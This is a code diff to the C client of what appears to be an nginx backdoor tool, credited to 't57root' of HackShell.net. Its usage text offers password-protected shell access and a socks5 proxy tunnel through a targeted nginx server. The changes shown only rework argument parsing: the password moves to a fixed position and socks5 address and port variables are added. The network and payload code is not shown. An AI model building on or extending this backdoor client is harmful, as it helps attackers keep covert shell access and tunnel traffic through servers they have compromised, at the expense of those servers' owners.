@@ -22,9 +22,11 @@
 #include "functions.h"
 
 
+char *password;
 char *ip;
 char *port;
-char *password;
+char *socks5ip;
+char *socks5port;
 
 int main(int argc,char **argv)
 {
@@ -33,22 +35,23 @@ int main(int argc,char **argv)
     "<t57root@gmail.com>  [www.HackShell.net]\n\n"
     "Usage:\n"
     "Get a shell access via the nginx running @ [ip]:[port]\n\t%s shell [ip] [port] [password]\n"
-    "Get a socks5 tunnel listening at [socks5ip]:[socks5port]\n\t%s socks5 [ip] [port] [socks5ip] [socks5port] [password]\n"
+    "Get a socks5 tunnel listening at [socks5ip]:[socks5port]\n\t%s socks5 [ip] [port] [password] [socks5ip] [socks5port]\n"
     ,argv[0],argv[0]);
     char *action = argv[1];
     ip = argv[2];
     port = argv[3];
+    password = argv[4];
 
     int function = 0;
 
     if((argc==5 && strncmp(action,"shell",5)==0)){
         function = 1;
-        password = argv[4];
         printf("\n[i] Obtaining shell access\n");
     }
     else if((argc==7 && strncmp(action,"socks5",6)==0)){
         function = 2;
-        password = argv[6];
+        socks5ip = argv[5];
+        socks5port = argv[6];
         printf("\n[i] Obtaining a socks5 proxy tunnel\n");
     }
     else return 0;
@@ -65,7 +68,7 @@ int main(int argc,char **argv)
     }
     else if(function==2){
         close(fd);
-        exec_socks5(argv);
+        exec_socks5();
     }
 
     return 0;
